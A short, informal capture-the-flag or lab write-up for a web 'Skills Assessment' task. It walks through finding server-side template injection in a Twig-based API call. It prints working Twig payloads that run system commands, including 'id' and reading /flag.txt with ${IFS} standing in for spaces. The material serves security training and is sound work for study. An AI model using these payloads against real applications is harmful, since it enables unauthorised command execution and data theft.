# Skills Assessment

* Obtain the flag.

> and they don't give shit

We can see a normali and basic web, without injectable camp but! if we intercept the main home peticion, we can see it:

<figure><img src="../../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

To API call, try SSRF and SSTI

<figure><img src="../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

Lol, i will try antoher metoh to know it is twig or jinja2 -->

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

Okay, is twig, now test LFI payloads -->

<figure><img src="../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

If we urlEncode the spaces, get us an error, we need found another metoh to put the spaces, for example delete its or use `${IFS}` -->

```
{{['id']|filter('system')}}
```

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

```
{{['cat${IFS}/flag.txt']|filter('system')}}
```

> Use ${IFS}
